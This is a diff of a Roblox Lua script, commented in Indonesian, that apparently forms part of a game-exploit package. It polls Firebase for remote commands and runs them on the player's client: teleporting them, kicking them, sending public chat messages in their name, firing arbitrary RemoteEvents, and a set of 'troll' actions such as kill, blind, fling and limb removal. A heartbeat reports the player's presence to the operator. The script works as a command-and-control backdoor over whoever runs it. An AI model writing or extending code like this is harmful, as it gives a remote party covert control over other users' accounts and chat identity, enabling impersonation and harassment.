@@ -1,58 +1,57 @@
 -- ================================================
--- COMMAND LISTENER - Fitur Lengkap (Premium + Heartbeat)
--- Mendengarkan perintah dari Admin Dashboard & Premium App lewat Firebase
--- /commands/<userId>/<cmdId> = {type="teleport"/"chat_broadcast"/"kick"/"force_chat"/"troll_action", ...}
+-- COMMAND LISTENER - Full Mega Upgrade Edition
+-- Mendengarkan perintah dari Firebase, mengeksekusi fitur Teleport, Admin, dan 20+ Troll Toggles
 -- ================================================
 
-local Services    = _G.Services
-local LocalPlayer = _G.LocalPlayer
-local Firebase    = _G.Firebase
-local TextChatService  = game:GetService("TextChatService")
+local Services         = _G.Services
+local LocalPlayer      = _G.LocalPlayer
+local Firebase         = _G.Firebase
 local TeleportService  = game:GetService("TeleportService")
-local Chat             = game:GetService("Chat")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting         = game:GetService("Lighting")
+local TextChatService  = game:GetService("TextChatService")
 
-local lastCheckedCmdIds = {} -- anti double-execute
+local lastCheckedCmdIds = {}
 
--- ==================== TELEPORT ====================
+-- Fungsi Dasar Teleport Player
 local function teleportPlayerTo(x, y, z)
     local char = LocalPlayer.Character
-    if not char then return false, "Karakter tidak ditemukan" end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return false, "HumanoidRootPart tidak ditemukan" end
-
-    local ok = pcall(function()
-        hrp.CFrame = CFrame.new(x, y, z)
-    end)
-    return ok
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
+        return true
+    end
+    return false
 end
 
--- ==================== CHAT BUBBLE DI ATAS KEPALA ====================
-local function showChatBubbleOverHead(message, senderLabel)
-    local char = LocalPlayer.Character
-    if not char then return false, "Karakter tidak ditemukan" end
-    local head = char:FindFirstChild("Head")
-    if not head then return false, "Head tidak ditemukan" end
-
-    local text = "[" .. (senderLabel or "ADMIN") .. "] " .. message
-
-    -- API resmi Roblox untuk memunculkan balon chat di atas kepala
-    local ok = pcall(function()
-        Chat:Chat(head, text, Enum.ChatColor.Red)
+-- Force Global Chat (Agar pesan terlihat oleh semua player di server)
+local function forceGlobalChat(message)
+    pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if channel then channel:SendAsync(message) end
+        else
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        end
     end)
+end
 
-    if not ok then
-        -- Fallback: BubbleChat modern
-        pcall(function()
-            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-        end)
-    end
-
-    return ok
+-- Mengeksekusi RemoteEvent command (cth: "re" untuk refresh avatar)
+local function fireRemoteCommand(remotePath, cmd)
+    pcall(function()
+        local pathParts = string.split(remotePath, ".")
+        local obj = game
+        for _, p in ipairs(pathParts) do 
+            obj = obj:WaitForChild(p, 2) 
+        end
+        if obj and obj:IsA("RemoteEvent") then
+            obj:FireServer(cmd, "me")
+        end
+    end)
 end
 
 -- ==================== CEK PENDING TELEPORT (SETELAH PINDAH SERVER) ====================
 task.spawn(function()
-    task.wait(5) -- tunggu karakter benar-benar spawn dulu di server baru
+    task.wait(5)
     if not Firebase or not Firebase.GetData then return end
 
     local ok, pending = pcall(function()
@@ -72,12 +71,12 @@ task.spawn(function()
     end
 end)
 
--- ==================== POLLING LOOP ====================
+-- ==================== POLLING LOOP UTAMA ====================
 task.spawn(function()
-    task.wait(4) -- tunggu Firebase & LocalPlayer siap
+    task.wait(4)
 
     while true do
-        task.wait(3)
+        task.wait(2)
 
         if not Firebase or not Firebase.GetCommands then continue end
 
@@ -90,28 +89,12 @@ task.spawn(function()
             if type(cmd) == "table" and not lastCheckedCmdIds[cmdId] then
                 lastCheckedCmdIds[cmdId] = true
 
-                if cmd.type == "teleport" then
-                    local x = tonumber(cmd.x) or 0
-                    local y = tonumber(cmd.y) or 0
-                    local z = tonumber(cmd.z) or 0
-                    local success = teleportPlayerTo(x, y, z)
-
-                    if success and _G.showDynamicNotification then
-                        _G.showDynamicNotification(
-                            "📍 Diteleport oleh Admin" .. (cmd.locationName and (" ke " .. cmd.locationName) or ""),
-                            Color3.fromRGB(0, 200, 255)
-                        )
-                    end
-
-                elseif cmd.type == "chat_broadcast" then
-                    showChatBubbleOverHead(cmd.message or "", cmd.senderLabel or "ADMIN")
-
-                elseif cmd.type == "teleport_to_point" then
+                -- 1. TELEPORT KE TITIK TERTENTU (TP-ON-TAP)
+                if cmd.type == "teleport_to_point" then
                     if cmd.fromJobId and cmd.fromJobId ~= game.JobId and cmd.fromPlaceId then
                         pcall(function()
                             Firebase.SetData("pending_teleport/" .. tostring(LocalPlayer.UserId), {
-                                x = cmd.x, y = cmd.y, z = cmd.z,
-                                timestamp = os.time(),
+                                x = cmd.x, y = cmd.y, z = cmd.z, timestamp = os.time(),
                             })
                         end)
                         pcall(function()
@@ -120,12 +103,10 @@ task.spawn(function()
                             )
                         end)
                     else
-                        local ok = teleportPlayerTo(cmd.x, cmd.y, cmd.z)
-                        if ok and _G.showDynamicNotification then
-                            _G.showDynamicNotification("📍 Dipindahkan oleh Dev", Color3.fromRGB(168,100,255))
-                        end
+                        teleportPlayerTo(cmd.x, cmd.y, cmd.z)
                     end
 
+                -- 2. TARIK KE SAYA (TELEPORT KE DEV)
                 elseif cmd.type == "teleport_to_dev" then
                     if cmd.devJobId and cmd.devJobId ~= game.JobId and cmd.devPlaceId then
                         pcall(function()
@@ -134,97 +115,144 @@ task.spawn(function()
                             )
                         end)
                     else
-                        local devPlayer = Services.Players:GetPlayerByUserId(tonumber(cmd.devUserId))
-                        if devPlayer and devPlayer.Character then
-                            local devHrp = devPlayer.Character:FindFirstChild("HumanoidRootPart")
-                            local myHrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                            if devHrp and myHrp then
-                                pcall(function()
-                                    myHrp.CFrame = devHrp.CFrame * CFrame.new(3, 0, 0)
-                                end)
-                            end
+                        local dev = Services.Players:GetPlayerByUserId(tonumber(cmd.devUserId))
+                        if dev and dev.Character and dev.Character:FindFirstChild("HumanoidRootPart") then
+                            local pos = dev.Character.HumanoidRootPart.Position
+                            teleportPlayerTo(pos.X + 3, pos.Y, pos.Z)
                         end
                     end
-                    if _G.showDynamicNotification then
-                        _G.showDynamicNotification("📍 Ditarik ke posisi Dev", Color3.fromRGB(168,100,255))
-                    end
 
-                elseif cmd.type == "kick" then
-                    pcall(function()
-                        LocalPlayer:Kick(cmd.reason or "Dikeluarkan oleh Admin.")
-                    end)
-
-                -- =================== FITUR PREMIUM (FORCE CHAT & TROLL) ===================
+                -- 3. FORCE CHAT PUBLIK
                 elseif cmd.type == "force_chat" then
-                    -- Memaksa target bicara menggunakan Chat Roblox Bawaan (Bubble Chat)
-                    local char = LocalPlayer.Character
-                    if char and char:FindFirstChild("Head") then
-                        Chat:Chat(char.Head, cmd.message or "...", Enum.ChatColor.White)
-                    end
+                    forceGlobalChat(cmd.message or "Halo!")
 
+                -- 4. REMOTE EVENT COMMAND (RE / REFRESH)
+                elseif cmd.type == "force_remote" then
+                    fireRemoteCommand(cmd.remotePath, cmd.cmd)
+
+                -- 5. KICK
+                elseif cmd.type == "kick" then
+                    pcall(function() LocalPlayer:Kick(cmd.reason or "Dikeluarkan oleh Admin.") end)
+
+                -- 6. TROLL ACTIONS (TOGGLE & INSTANT)
                 elseif cmd.type == "troll_action" then
-                    local action = cmd.action
+                    local act = cmd.action
                     local char = LocalPlayer.Character
-                    if char then
-                        local hrp = char:FindFirstChild("HumanoidRootPart")
-                        local hum = char:FindFirstChild("Humanoid")
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    local hum = char and char:FindFirstChild("Humanoid")
 
-                        if action == "jail" then
-                            if hrp then
-                                -- Hapus box lama jika ada agar tidak tertumpuk
-                                local oldBox = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
-                                if oldBox then oldBox:Destroy() end
+                    if act == "jail" and hrp then
+                        local oldBox = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
+                        if oldBox then oldBox:Destroy() end
 
-                                -- Bikin box kaca
-                                local box = Instance.new("Part")
-                                box.Name = "PremiumJailBox_" .. LocalPlayer.Name
-                                box.Size = Vector3.new(5, 7, 5)
-                                box.Position = hrp.Position
-                                box.Anchored = true
-                                box.Material = Enum.Material.Glass
-                                box.Transparency = 0.5
-                                box.BrickColor = BrickColor.new("Cyan")
-                                box.Parent = game.Workspace
-                                
-                                hrp.CFrame = CFrame.new(box.Position)
-                                if hum then
-                                    hum.WalkSpeed = 0
-                                    hum.JumpPower = 0
-                                end
+                        local box = Instance.new("Part")
+                        box.Name = "PremiumJailBox_" .. LocalPlayer.Name
+                        box.Size = Vector3.new(5, 7, 5)
+                        box.Position = hrp.Position
+                        box.Anchored = true
+                        box.Material = Enum.Material.Glass
+                        box.Transparency = 0.5
+                        box.BrickColor = BrickColor.new("Cyan")
+                        box.Parent = game.Workspace
+                        
+                        hrp.CFrame = CFrame.new(box.Position)
+                        if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
+
+                    elseif act == "unjail" then
+                        local box = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
+                        if box then box:Destroy() end
+                        if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
+
+                    elseif act == "freeze" and hrp then
+                        hrp.Anchored = true
+                    elseif act == "unfreeze" and hrp then
+                        hrp.Anchored = false
+
+                    elseif act == "blind" then
+                        local ui = LocalPlayer.PlayerGui:FindFirstChild("BlindUI") or Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+                        ui.Name = "BlindUI"
+                        ui.IgnoreGuiInset = true
+                        local f = Instance.new("Frame", ui)
+                        f.Size = UDim2.new(1, 0, 1, 0)
+                        f.BackgroundColor3 = Color3.new(0, 0, 0)
+                    elseif act == "unblind" then
+                        local ui = LocalPlayer.PlayerGui:FindFirstChild("BlindUI")
+                        if ui then ui:Destroy() end
+
+                    elseif act == "blur" then
+                        local b = Lighting:FindFirstChild("TrollBlur") or Instance.new("BlurEffect", Lighting)
+                        b.Name = "TrollBlur"
+                        b.Size = 24
+                    elseif act == "unblur" then
+                        local b = Lighting:FindFirstChild("TrollBlur")
+                        if b then b:Destroy() end
+
+                    elseif act == "fire" and hrp then
+                        local f = hrp:FindFirstChild("TrollFire") or Instance.new("Fire", hrp)
+                        f.Name = "TrollFire"
+                        f.Size = 10
+                    elseif act == "unfire" and hrp then
+                        local f = hrp:FindFirstChild("TrollFire")
+                        if f then f:Destroy() end
+
+                    elseif act == "smoke" and hrp then
+                        local s = hrp:FindFirstChild("TrollSmoke") or Instance.new("Smoke", hrp)
+                        s.Name = "TrollSmoke"
+                        s.Size = 10
+                    elseif act == "unsmoke" and hrp then
+                        local s = hrp:FindFirstChild("TrollSmoke")
+                        if s then s:Destroy() end
+
+                    elseif act == "forcesit" and hum then
+                        hum.Sit = true
+                    elseif act == "unforcesit" and hum then
+                        hum.Sit = false
+                    
+                    elseif act == "spin" and hrp then
+                        local b = hrp:FindFirstChild("TrollSpin") or Instance.new("BodyAngularVelocity", hrp)
+                        b.Name = "TrollSpin"
+                        b.AngularVelocity = Vector3.new(0, 50, 0)
+                        b.MaxTorque = Vector3.new(0, math.huge, 0)
+                    elseif act == "unspin" and hrp then
+                        local b = hrp:FindFirstChild("TrollSpin")
+                        if b then b:Destroy() end
+
+                    elseif act == "slow" and hum then
+                        hum.WalkSpeed = 2
+                    elseif act == "unslow" and hum then
+                        hum.WalkSpeed = 16
+
+                    elseif act == "highjump" and hum then
+                        hum.JumpPower = 200
+                    elseif act == "unhighjump" and hum then
+                        hum.JumpPower = 50
+
+                    elseif act == "kill" and hum then
+                        hum.Health = 0
+
+                    elseif act == "fling" and hrp then
+                        hrp.Velocity = Vector3.new(0, 1000, 0)
+                        local bg = Instance.new("BodyAngularVelocity")
+                        bg.AngularVelocity = Vector3.new(50, 50, 50)
+                        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                        bg.Parent = hrp
+                        game.Debris:AddItem(bg, 2)
+
+                    elseif act == "nolimbs" and char then
+                        for _, p in ipairs(char:GetChildren()) do
+                            if p:IsA("BasePart") and (string.find(p.Name, "Arm") or string.find(p.Name, "Leg")) then
+                                p:Destroy()
                             end
+                        end
 
-                        elseif action == "unjail" then
-                            local box = game.Workspace:FindFirstChild("PremiumJailBox_" .. LocalPlayer.Name)
-                            if box then box:Destroy() end
-                            if hum then 
-                                hum.WalkSpeed = 16
-                                hum.JumpPower = 50
-                            end
-
-                        elseif action == "freeze" then
-                            if hrp then hrp.Anchored = true end
-
-                        elseif action == "unfreeze" then
-                            if hrp then hrp.Anchored = false end
-
-                        elseif action == "fling" then
-                            if hrp then
-                                hrp.Velocity = Vector3.new(0, 1000, 0) -- Lempar ke langit
-                                local bg = Instance.new("BodyAngularVelocity")
-                                bg.AngularVelocity = Vector3.new(50, 50, 50)
-                                bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-                                bg.Parent = hrp
-                                game.Debris:AddItem(bg, 2)
-                            end
-
-                        elseif action == "kill" then
-                            if hum then hum.Health = 0 end
+                    elseif act == "noclip" and char then
+                        for _, p in ipairs(char:GetChildren()) do
+                            if p:IsA("BasePart") then p.CanCollide = false end
                         end
                     end
                 end
-                -- ==============================================================================
 
-                -- Hapus command setelah dieksekusi supaya tidak diulang
+                -- Hapus command setelah sukses dieksekusi
                 pcall(function()
                     Firebase.DeleteCommand(LocalPlayer.UserId, cmdId)
                 end)
@@ -233,16 +261,12 @@ task.spawn(function()
     end
 end)
 
--- ==================== ONLINE HEARTBEAT (AGAR MUNCUL DI TAB TARGET) ====================
--- Mengirimkan sinyal ke Firebase setiap 60 detik bahwa player ini masih online.
--- Tanpa ini, Premium.lua akan menganggap player offline karena filter > 120 detik.
+-- ==================== ONLINE HEARTBEAT (KIRIM SINYAL SETIAP 60 DETIK) ====================
 task.spawn(function()
-    task.wait(5) -- Tunggu game loading selesai
-    
+    task.wait(5)
     while true do
         pcall(function()
             if Firebase and Firebase.SetOnline then
-                -- Ambil nama map (pcall agar tidak error jika PlaceId belum termuat sempurna)
                 local mapName = "Roblox Game"
                 pcall(function()
                     mapName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
@@ -259,11 +283,11 @@ task.spawn(function()
                 })
             end
         end)
-        task.wait(60) -- Ulangi setiap 1 Menit
+        task.wait(60)
     end
 end)
 
--- Menghapus data online secara instan saat pemain keluar dari game (Opsional & Cepat)
+-- Bersihkan data saat player keluar
 game:GetService("Players").PlayerRemoving:Connect(function(player)
     if player == LocalPlayer then
         pcall(function()
@@ -274,4 +298,4 @@ game:GetService("Players").PlayerRemoving:Connect(function(player)
     end
 end)
 
-print("[CommandListener] Loaded! Mendengarkan perintah dan mengirim sinyal online.")
+print("[CommandListener] Full Engine Loaded Successfully!")
